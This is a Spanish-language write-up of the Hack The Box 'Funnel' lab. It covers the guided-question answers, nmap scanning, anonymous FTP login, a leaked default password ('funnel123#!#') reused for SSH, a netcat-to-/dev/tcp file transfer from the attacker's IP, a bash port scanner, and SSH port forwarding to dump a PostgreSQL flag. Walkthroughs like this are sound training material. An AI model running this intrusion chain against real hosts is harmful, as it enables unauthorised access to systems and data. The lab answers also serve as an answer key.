---
title: Writeup funnel - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - funnel
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina funnel en Hack The Box.
keywords:
  - writeup funnel
  - hack the box funnel
  - resolución máquina funnel
  - funnel hack the box
  - htb funnel
---
----------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+1/Linux/Funnel)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=VzS3cpyRyuc)
- 🧠 **Explicación resumida**: 

------

#easy #linux #nmap #ping  #ftp #cat #ssh #portscannersh

------
# Guided Mode

1)¿Cuántos puertos TCP hay abiertos?
	2

2)¿Cuál es el nombre del directorio disponible en el servidor FTP?
	mail_backup

3)¿Cuál es la contraseña por defecto de la cuenta que todo nuevo miembro del equipo «Embudo» debe cambiar lo antes posible?
	funnel123#!#

4)¿Qué usuario no ha cambiado aún su contraseña por defecto?
	christine

5)¿Qué servicio se ejecuta en el puerto TCP 5432 y sólo escucha en localhost?
	postgresql

6)En este escenario, necesitas acceder a un servicio que se ejecuta en el servidor. Por lo tanto, generará tráfico dirigido a un puerto en su máquina local y, a su vez, SSH hará un túnel con este tráfico hacia el puerto remoto.
	local port forwarding

7)¿Cómo se llama la base de datos que contiene la bandera?
	secrets

8)¿Podría utilizar un túnel dinámico en lugar del reenvío local de puertos? Sí o No.
	yes

---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.243.9
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.243.9 -oG allPorts
extractPorts allPorts
nmap -sCV -p21,22 10.129.243.9 -oN target
```

![[Funnel1.png]]

![[Funnel2.png]]

![[Funnel3.png]]
*TTL:* Maquina Linux
*Puertos*:
	`21` [[ftp]]
	`22` [[ssh]]
*Datos Importantes:*
	El servicio [[ftp]] tiene la vulnerabilidad para conectarse como el usuario *anonymous*

------
# Conexion por [[ftp]]

Nos conectamos con el comando `ftp 10.129.243.9`, en usuario ponemos anonymous y en contraseña no colocamos nada. Esta es la vulnerabilidad que vimos antes con el escaneo de nmap
Entramos al directorio mail_backup y descargamos con el comando `get` los archivos password_policy.pdf y welcome_28112022

![[Funnel4.png]]

----------
### Analizamos el contenido de los archivos

*Archivo welcome_28112022:*

![[Funnel5.png]]
Nos da la informacion de que existen los usuarios, optimus, albert, andreas, christine, y maria

*Archivo password_policy.pdf*
Lo abrimos con el comando `xdg-open password_policy.pdf`

![[Funnel6.png]]
Nos informa que los usuarios nuevos tienen por defecto la contraseña ``funnel123#!#``

--------
## Conexion por [[ssh]]

El usuario christine no habia cambiado su contraseña y nos conectamos con `ssh christine@10.129.243.9 -p 22`
![[Funnel7.png]]
Ya estamos dentro de la maquina

----------

# [[Tratamiento de la TTY]]

------------
### Vamos a escanear los puertos con [[portScanner.sh a nivel local]]

Nuestra maquina: ``nc -nlvp 443 < portScanner.sh``
Maquina victima: ``cat < /dev/tcp/10.10.16.3/443 > portScanner.sh``

```
#!/bin/bash

function ctrl_c(){
  echo "[!]Saliendo..."
  exit 1
}

trap ctrl_c INT

for i in $(seq 1 65535); do
  timeout 1 bash -c "echo '' > /dev/tcp/127.0.0.1/$i" 2>/dev/null && "[!]Puerto abierto: $i" &
done
```

Y le damos permiso de ejecucion al archivo con `chmod +x portscanner.sh`

![[Funnel8.png]]
Sabemos que esta abierto el 21:ftp, 22:ssh, y el 5432 que no sabemos que es

Para saber que servicio corre en el puerto 5432 vamos a usar [[getent services]] con el comando `getent services 5432`. Y por detecto en este puerto corre el servicio postgresql
![[Funnel9.png]]

--------
# Conexion por [[postgresql]] y tunneling de [[ssh]]

Nos vamos a conectar nuevamente por [[ssh]] pero haciendo que el puerto de la maquina victima 5432 sea nuestro puerto 1234
``ssh -L 1234:localhost:5432 christine@10.129.243.9``


Y ahora nos vamos a poder conectar a la [[postgresql]] con el comando ``psql -U christine -h localhost -p 1234``
y cuando nos pide contraseña ponemos la misma de antes funnel123#!#

Una vez dentro de la base de datos, listamos la flag
```posgresql
`\l                   |para ver las bases de datos
\c                    |secrets para usar la base de datos
\dt                   |para ver las tablas y columnas
SELECT * FROM flag;   | para listar todo el contenido de la tabla flag
```

![[Funnel10.png]]

----------
# Creditos
Writeup Oficial HackTheBox